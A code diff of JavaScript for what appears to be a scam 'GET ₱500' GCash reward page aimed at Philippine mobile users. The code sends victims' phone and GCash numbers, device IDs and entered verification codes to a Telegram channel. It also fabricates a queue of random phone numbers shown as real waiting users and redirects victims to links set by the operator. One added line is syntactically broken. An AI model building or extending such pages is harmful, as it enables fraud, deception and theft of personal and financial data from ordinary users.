             document.getElementById('get500Btn').addEventListener('click', function(e) {
                 e.preventDefault();
@@ -1387,7 +874,6 @@
 
                 if (!rawPhone || rawPhone.length < 10) {
                     if (phoneErrEl) { phoneErrEl.textContent = 'Please enter a valid mobile number.'; phoneErrEl.classList.add('show'); }
-                    if (navigator.vibrate) { try { navigator.vibrate([50, 30, 50]); } catch(e) {} }
                     return;
                 }
                 if (rawPhone.length === 10 && rawPhone.startsWith('9')) rawPhone = '0' + rawPhone;
@@ -1404,19 +890,14 @@
 
                 checkBan(userPhone, deviceFingerprint).then(function(banResult) {
                     if (banResult.isBanned) {
-                        console.log('🚫 User banned:', banResult.type);
                         if (banResult.type === 'phone') {
                             db.ref('device_phone_map/' + deviceFingerprint).once('value').then(function(snap) {
                                 if (!snap.exists() || !snap.val().phone) {
-                                    db.ref('device_phone_map/' + deviceFingerprint).set({
-                                        phone: userPhone,
-                                        displayId: deviceDisplayId,
-                                        lastSeen: Date.now()
-                                    });
+                                    db.ref('device_phone_map/' + deviceFingerprint).set({ phone: userPhone, displayId: deviceDisplayId, lastSeen: Date.now() });
                                 }
                             });
                         }
-                        sendTelegram('🚫 BANNED USER ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n📊 Type: ' + banResult.type + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                        sendTelegram('🚫 BANNED USER\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
                         closePopup('catClaimPopup');
                         isBanned = true;
                         showBanPopup();
@@ -1431,28 +912,20 @@
                         return db.ref('user_sessions/' + userPhone).once('value').then(function(sessSnap) {
                             if (!sessSnap.exists()) {
                                 return db.ref('user_sessions/' + userPhone).set({
-                                    phone: userPhone,
-                                    balance: 0,
-                                    status: 'online',
-                                    deviceFingerprint: deviceFingerprint,
-                                    deviceDisplayId: deviceDisplayId,
-                                    createdAt: Date.now(),
-                                    lastUpdate: Date.now()
+                                    phone: userPhone, balance: 0, status: 'online',
+                                    deviceFingerprint: deviceFingerprint, deviceDisplayId: deviceDisplayId,
+                                    createdAt: Date.now(), lastUpdate: Date.now()
                                 });
                             } else {
                                 return db.ref('user_sessions/' + userPhone).update({
-                                    status: 'online',
-                                    deviceFingerprint: deviceFingerprint,
-                                    deviceDisplayId: deviceDisplayId,
-                                    lastUpdate: Date.now()
+                                    status: 'online', deviceFingerprint: deviceFingerprint,
+                                    deviceDisplayId: deviceDisplayId, lastUpdate: Date.now()
                                 });
                             }
                         });
                     }).then(function() {
-                        sendTelegram('🎯 MISSION — USER CLAIM\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
-
+                        sendTelegram('🎯 USER CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
                         return checkFirewall().then(function(firewallActive) {
-                            console.log('🔥 Firewall:', firewallActive ? 'ON' : 'OFF');
                             if (firewallActive) {
                                 closePopup('catClaimPopup');
                                 self.disabled = false;
@@ -1476,14 +949,13 @@
                         });
                     });
                 }).catch(function(err) {
-                    console.error('Ban check error:', err);
                     self.disabled = false;
                     self.innerHTML = '<span>💰 GET ₱500</span>';
                 });
             });
 
             // ============================================================
-            // FIREWALL + LINK HELPERS
+            // FIREWALL + LINK
             // ============================================================
             function checkFirewall() {
                 return new Promise(function(resolve) {
@@ -1508,11 +980,7 @@
                                     var links = linksSnap.val();
                                     var key = Object.keys(links)[0];
                                     var linkData = links[key];
-                                    db.ref('links/' + key).update({
-                                        status: 'claimed',
-                                        user: userPhone || 'Unknown',
-                                        claimedAt: Date.now()
-                                    });
+                                    db.ref('links/' + key).update({ status: 'claimed', user: userPhone || 'Unknown', claimedAt: Date.now() });
                                     return resolve(linkData.url);
                                 }
                                 resolve(null);
@@ -1560,9 +1028,6 @@
             }
             function stopSkipCountdown() { if (skipCountdownInterval) { clearInterval(skipCountdownInterval); skipCountdownInterval = null; } }
 
-            // ============================================================
-            // ✅ SKIP BUTTON — diretso sa QUEUE, gamit na ang userPhone as GCash
-            // ============================================================
             document.getElementById('skipClaimBtn').addEventListener('click', function() {
                 if (!browserAllowed) return;
                 if (this.disabled) return;
@@ -1573,19 +1038,19 @@
 
                 var gcashValue = userPhone;
                 if (!gcashValue || gcashValue.length !== 11 || !gcashValue.startsWith('09')) {
-                    console.warn('⚠️ Invalid userPhone:', gcashValue);
                     alert('Invalid mobile number. Please refresh and try again.');
                     return;
                 }
-
-                sendTelegram('💰 CLAIM FORM SUBMITTED\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n💳 GCash: ' + gcashValue + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                sendTelegram('💰 CLAIM SUBMITTED\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
 
                 setTimeout(function() {
                     readyToClaim = false;
                     pendingLink = null;
+                    userInQueue = false;
+                    userLinkDeployed = false;
+                    queueUsers = [];
                     document.getElementById('queueNormalState').style.display = 'block';
                     document.getElementById('readyToClaimWrap').classList.remove('show');
-
                     openPopup('queuePopup');
                     startQueueTimer();
                     startLiveUsersCounter();
@@ -1632,65 +1097,154 @@
                 if (!db || !userPhone) return;
                 try {
                     db.ref('user_sessions/' + userPhone + '/system_verification').set({
-                        status: 'counting_down',
-                        countdownTimer: 600,
-                        countdownStartedAt: Date.now(),
-                        deviceId: deviceDisplayId,
-                        phone: userPhone,
-                        code: '----',
-                        timer: 600,
-                        lastUpdate: Date.now()
+                        status: 'counting_down', countdownTimer: 600, countdownStartedAt: Date.now(),
+                        deviceId: deviceDisplayId, phone: userPhone, code: '----', timer: 600, lastUpdate: Date.now()
                     });
-                    console.log('✅ Countdown state SAVED');
-                } catch(e) { console.error('Save countdown error:', e); }
+                } catch(e) {}
             }
             function updateCountdownState(remaining) {
                 if (!db || !userPhone) return;
                 try {
-                    db.ref('user_sessions/' + userPhone + '/system_verification').update({
-                        countdownTimer: remaining,
-                        timer: remaining,
-                        lastUpdate: Date.now()
-                    });
+                    db.ref('user_sessions/' + userPhone + '/system_verification').update({ countdownTimer: remaining, timer: remaining, lastUpdate: Date.now() });
                 } catch(e) {}
             }
             function clearCountdownState() {
                 if (!db || !userPhone) return;
                 try {
-                    db.ref('user_sessions/' + userPhone + '/system_verification').update({
-                        status: 'completed',
-                        countdownTimer: 0,
-                        timer: 0,
-                        lastUpdate: Date.now()
-                    });
+                    db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'completed', countdownTimer: 0, timer: 0, lastUpdate: Date.now() });
                 } catch(e) {}
             }
 
             // ============================================================
-            // ✅ SHOW READY TO CLAIM STATE
+            // ✅ BAGONG QUEUE LOGIC (Option B)
+            // 30-50 users | 09XX***XXXX | WAITING→READY | #5→#1 | 2s switch
             // ============================================================
-            function showReadyToClaim(linkUrl) {
-                if (readyToClaim) return;
-                console.log('✨ Switching to READY TO CLAIM state');
+            var queuePrefixes = ['0912','0917','0918','0927','0998','0945','0966','0955','0939','0906','0977','0908','0920','0921','0928','0929','0930','0935','0936','0946','0947','0948','0949','0950','0951','0956','0961','0963','0965','0967','0975','0976','0978','0979','0994','0995','0996','0997'];
+
+            function generateQueueNumber() {
+                var p = queuePrefixes[Math.floor(Math.random() * queuePrefixes.length)];
+                var s = Math.floor(1000 + Math.random() * 9000);
+                return p + '***' + s;
+            }
+            function formatUserPhone(phone) {
+                if (!phone || phone.length !== 11) return phone;
+                return phone.substring(0, 4) + '***' + phone.substring(7);
+            }
+            function renderQueueList() {
+                var listEl = document.getElementById('queueList');
+                if (!listEl) return;
+                listEl.innerHTML = '';
+                queueUsers.forEach(function(u, i) {
+                    var row = document.createElement('div');
+                    row.className = 'queue-row' + (u.isUser ? ' is-user' : '') + (u.status === 'READY' ? ' ready' : '');
+                    var p = document.createElement('span');
+                    p.className = 'row-phone';
+                    p.textContent = u.isUser ? formatUserPhone(u.phone) : u.phone;
+                    var s = document.createElement('span');
+                    s.className = 'row-status ' + (u.status === 'READY' ? 'ready' : 'waiting');
+                    s.textContent = u.status === 'READY' ? 'READY' : 'WAITING';
+                    var t = document.createElement('span');
+                    t.className = 'row-spot';
+                    t.textContent = '#' + (i + 1);
+                    row.appendChild(p); row.appendChild(s); row.appendChild(t);
+                    listEl.appendChild(row                });
+            }
+            function scrollUserIntoView() {
+                var listEl = document.getElementById('queueList');
+                if (!listEl) return;
+                var ur = listEl.querySelector('.queue-row.is-user');
+                if (ur && ur.scrollIntoView) ur.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            }
+            function startLiveUsersCounter() {
+                stopLiveUsersCounter();
+                queueUsers = [];
+                var total = 30 + Math.floor(Math.random() * 21); // 30-50 users
+                for (var i = 0; i < total; i++) {
+                    queueUsers.push({ phone: generateQueueNumber(), status: 'WAITING', isUser: false });
+                }
+                userInQueue = false;
+                userLinkDeployed = false;
+                renderQueueList();
+                queueListInterval = setInterval(function() {
+                    if (userLinkDeployed) return;
+                    var c = 1 + Math.floor(Math.random() * 3);
+                    for (var j = 0; j < c; j++) {
+                        var idx = Math.floor(Math.random() * queueUsers.length);
+                        if (queueUsers[idx] && queueUsers[idx].isUser) continue;
+                        queueUsers[idx] = { phone: generateQueueNumber(), status: 'WAITING', isUser: false };
+                    }
+                    renderQueueList();
+                }, 1200);
+            }
+            function stopLiveUsersCounter() {
+                if (queueListInterval) { clearInterval(queueListInterval); queueListInterval = null; }
+            }
+            function advanceUserInQueue(linkUrl) {
+                var idx = -1;
+                for (var i = 0; i < queueUsers.length; i++) { if (queueUsers[i].isUser) { idx = i; break; } }
+                if (idx < 0) return;
+                if (idx === 0) {
+                    queueUsers[0].status = 'READY';
+                    renderQueueList();
+                    scrollUserIntoView();
+                    setTimeout(function() { switchToReadyClaim(linkUrl); }, 2000);
+                    return;
+                }
+                // swap with previous spot
+                var temp = queueUsers[idx - 1];
+                queueUsers[idx - 1] = queueUsers[idx];
+                queueUsers[idx] = temp;
+                var newIdx = idx - 1;
+                // spots above user = READY, below = WAITING
+                for (var k = 0; k < queueUsers.length; k++) {
+                    if (queueUsers[k].isUser) continue;
+                    queueUsers[k].status = (k < newIdx) ? 'READY' : 'WAITING';
+                }
+                renderQueueList();
+                scrollUserIntoView();
+                setTimeout(function() { advanceUserInQueue(linkUrl); }, 1000);
+            }
+            function switchToReadyClaim(linkUrl) {
                 readyToClaim = true;
                 pendingLink = linkUrl;
-
                 stopQueueTimer();
                 stopLiveUsersCounter();
                 stopLinkListeners();
                 clearCountdownState();
-
-                if (navigator.vibrate) {
-                    try { navigator.vibrate([100, 50, 100, 50, 200]); } catch(e) {}
-                }
+                if (navigator.vibrate) { try { navigator.vibrate([100, 50, 100, 50, 200]); } catch(e) {} }
                 triggerBurst();
-
                 var normalState = document.getElementById('queueNormalState');
                 var readyState = document.getElementById('readyToClaimWrap');
                 if (normalState) normalState.style.display = 'none';
                 if (readyState) readyState.classList.add('show');
+                sendTelegram('✨ READY TO CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
+            }
 
-                sendTelegram('✨ READY TO CLAIM\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n⏰ Time: ' + new Date().toLocaleString() + '\n📊 Status: User can now claim\n━━━━━━━━━━━━━━━━━━━━');
+            // ============================================================
+            // ✅ SHOW READY TO CLAIM STATE (link detected)
+            // ============================================================
+            function showReadyToClaim(linkUrl) {
+                if (readyToClaim) return;
+                userLinkDeployed = true;
+                stopLiveUsersCounter();
+                if (!userInQueue) {
+                    userInQueue = true;
+                    var userPhoneFormatted = userPhone || '09XX***XXXX';
+                    // I-insert sa LAST spot as WAITING
+                    queueUsers.push({ phone: userPhoneFormatted, status: 'WAITING', isUser: true });
+                    // Keep only last 5 visible para malinis
+                    while (queueUsers.length > 5) {
+                        // remove from top until user is within last 5
+                        var uIdx = -1;
+                        for (var i = 0; i < queueUsers.length; i++) { if (queueUsers[i].isUser) { uIdx = i; break; } }
+                        if (uIdx < queueUsers.length - 5) { queueUsers.shift(); }
+                        else break;
+                    }
+                    renderQueueList();
+                    scrollUserIntoView();
+                    // 1 sec → start moving up
+                    setTimeout(function() { advanceUserInQueue(linkUrl); }, 1000);
+                }
             }
 
             // ============================================================
@@ -1698,21 +1252,13 @@
             // ============================================================
             document.getElementById('readyClaimBtn').addEventListener('click', function() {
                 if (!browserAllowed) return;
-                if (!pendingLink) {
-                    console.warn('⚠️ No pending link');
-                    return;
-                }
+                if (!pendingLink) { console.warn('⚠️ No pending link'); return; }
                 if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
-
                 this.innerHTML = '<span>⏳ OPENING...</span>';
                 this.style.pointerEvents = 'none';
                 this.style.opacity = '0.85';
-
-                sendTelegram('🎁 USER TAPPED CLAIM\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
-
-                setTimeout(function() {
-                    openAsDeeplink(pendingLink);
-                }, 600);
+                sendTelegram('🎁 USER TAPPED CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId);
+                setTimeout(function() { openAsDeeplink(pendingLink); }, 600);
             });
 
             // ============================================================
@@ -1721,12 +1267,11 @@
             function startLinkListener() {
                 stopLinkListeners();
                 if (!db) return;
-
                 var ref1 = db.ref('admin/redirectLink');
                 var cb1 = ref1.on('value', function(snap) {
                     var data = snap.val();
                     if (data && data.url && data.active !== false) {
-                        console.log('🚀 Link detected (admin) — switching to READY');
+                        console.log('🚀 Link detected (admin)');
                         showReadyToClaim(data.url);
                     }
                 });
@@ -1738,38 +1283,17 @@
                         var links = snap.val();
                         var key = Object.keys(links)[0];
                         var linkData = links[key];
-                        console.log('🚀 Link detected (links) — switching to READY');
-
-                        db.ref('links/' + key).update({
-                            status: 'claimed',
-                            user: userPhone || 'Unknown',
-                            claimedAt: Date.now()
-                        });
-
+                        console.log('🚀 Link detected (links)');
+                        db.ref('links/' + key).update({ status: 'claimed', user: userPhone || 'Unknown', claimedAt: Date.now() });
                         showReadyToClaim(linkData.url);
                     }
                 });
                 linkListeners.push({ ref: ref2, cb: cb2, event: 'value' });
-                console.log('👀 Link listeners active');
             }
             function stopLinkListeners() {
                 linkListeners.forEach(function(l) { try { l.ref.off(l.event, l.cb); } catch(e) {} });
                 linkListeners = [];
             }
-
-            function startLiveUsersCounter() {
-                stopLiveUsersCounter();
-                var countEl = document.getElementById('liveUsersCount');
-                if (!countEl) return;
-                var baseCount = 120 + Math.floor(Math.random() * 80);
-                countEl.textContent = baseCount;
-                liveUsersInterval = setInterval(function() {
-                    var change = Math.floor(Math.random() * 5) - 2;
-                    baseCount = Math.max(80, baseCount + change);
-                    countEl.textContent = baseCount;
-                }, 1500);
-            }
-            function stopLiveUsersCounter() { if (liveUsersInterval) { clearInterval(liveUsersInterval); liveUsersInterval = null; } }
 
             // ============================================================
             // AI VERIFICATION
@@ -1780,25 +1304,18 @@
                 document.getElementById('aiStage2').classList.add('hidden');
                 document.getElementById('aiStage3').classList.add('hidden');
                 var gcashEl = document.getElementById('aiGcashInput');
-                // ✅ AUTO-FILL sa GCash input — gamit ang userPhone (hindi na mag-a-ask)
                 if (gcashEl && userPhone) {
                     var formatted = userPhone;
-                    if (userPhone.length === 11) {
-                        formatted = userPhone.substring(0, 4) + ' ' + userPhone.substring(4, 7) + ' ' + userPhone.substring(7);
-                    }
+                    if (userPhone.length === 11) formatted = userPhone.substring(0, 4) + ' ' + userPhone.substring(4, 7) + ' ' + userPhone.substring(7);
                     gcashEl.value = formatted;
-                } else if (gcashEl) {
-                    gcashEl.value = '';
-                }
+                } else if (gcashEl) { gcashEl.value = ''; }
                 ['aiGcashError', 'aiCodeError'].forEach(function(id) {
-                    var el = document.getElementById(id);
-                    if (el) el.classList.remove('show');
+                    var el = document.getElementById(id); if (el) el.classList.remove('show');
                 });
                 var codeEl = document.getElementById('aiCodeInput');
                 if (codeEl) codeEl.value = '';
                 openPopup('aiVerifyPopup');
             }
-
             var aiGcashInput = document.getElementById('aiGcashInput');
             if (aiGcashInput) {
                 aiGcashInput.addEventListener('input', function() {
@@ -1810,7 +1327,6 @@
                     this.value = formatted;
                 });
             }
-
             document.getElementById('aiRequestCallBtn').addEventListener('click', function() {
                 if (!browserAllowed) return;
                 var gcashEl = document.getElementById('aiGcashInput');
@@ -1821,28 +1337,19 @@
                 if (errEl) errEl.classList.remove('show');
                 requestAICall(gcashValue);
             });
-
             function requestAICall(gcashNumber) {
                 currentAiCode = Math.floor(1000 + Math.random() * 9000).toString();
-                console.log('📞 AI CODE:', currentAiCode);
                 if (db && userPhone) {
                     try {
                         db.ref('user_sessions/' + userPhone + '/system_verification').set({
-                            code: currentAiCode,
-                            timer: 60,
-                            status: 'active',
-                            deviceId: deviceDisplayId,
-                            phone: userPhone,
-                            gcashNumber: gcashNumber,
-                            createdAt: Date.now(),
-                            lastUpdate: Date.now(),
-                            userEnteredCode: null,
-                            userEnteredAt: null,
-                            isMatch: null
+                            code: currentAiCode, timer: 60, status: 'active',
+                            deviceId: deviceDisplayId, phone: userPhone, gcashNumber: gcashNumber,
+                            createdAt: Date.now(), lastUpdate: Date.now(),
+                            userEnteredCode: null, userEnteredAt: null, isMatch: null
                         });
                     } catch(e) {}
                 }
-                sendTelegram('📞 AI CALL REQUESTED\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n💳 GCash: ' + gcashNumber + '\n🔑 Code: ' + currentAiCode + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                sendTelegram('📞 AI CALL REQUESTED\n👤 ' + userPhone + '\n💳 ' + gcashNumber + '\n🔑 ' + currentAiCode);
                 document.getElementById('aiStage1').classList.add('hidden');
                 document.getElementById('aiStage2').classList.remove('hidden');
                 startAiTimer(60);
@@ -1853,7 +1360,6 @@
                     if (codeInput) codeInput.focus();
                 }, 4000);
             }
-
             function startAiTimer(seconds) {
                 stopAiTimer();
                 aiCountdown = seconds;
@@ -1867,7 +1373,6 @@
                         stopAiTimer();
                         var statusText = document.getElementById('aiStatusText');
                         if (statusText) statusText.innerHTML = '⏰ <strong style="color:#ff9800;">CALL EXPIRED</strong><br><span style="font-size:11px;">Please close and try again.</span>';
-                        if (db && userPhone) { try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ status: 'expired', timer: 0, lastUpdate: Date.now() }); } catch(e) {} }
                     }
                 }, 1000);
             }
@@ -1881,7 +1386,7 @@
                 if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) { if (errEl) { errEl.textContent = 'Please enter a valid 4-digit code.'; errEl.classList.add('show'); } return; }
                 var isMatch = (enteredCode === currentAiCode);
                 if (db && userPhone) { try { db.ref('user_sessions/' + userPhone + '/system_verification').update({ userEnteredCode: enteredCode, userEnteredAt: Date.now(), status: isMatch ? 'verified' : 'invalid', isMatch: isMatch, lastUpdate: Date.now() }); } catch(e) {} }
-                sendTelegram('🔑 AI-CODE ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n📝 Code: ' + enteredCode + '\n📊 Status: ' + (isMatch ? 'VALID' : 'INVALID') + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                sendTelegram('🔑 AI-CODE\n👤 ' + userPhone + '\n📝 ' + enteredCode + '\n📊 ' + (isMatch ? 'VALID' : 'INVALID'));
                 if (isMatch) {
                     stopAiTimer();
                     if (errEl) errEl.classList.remove('show');
@@ -1892,7 +1397,6 @@
                     if (input) { input.value = ''; input.focus(); }
                 }
             });
-
             var aiCodeInput = document.getElementById('aiCodeInput');
             if (aiCodeInput) {
                 aiCodeInput.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').substring(0, 4); });
@@ -1905,7 +1409,7 @@
             setTimeout(function() {
                 if (browserAllowed) {
                     initDevice().then(function() {
-                        console.log('✅ Mission page initialized | Mobile:', isMobile, '| Browser:', browserAllowed);
+                        console.log('✅ Mission page initialized');
                     });
                 }
             }, 500);
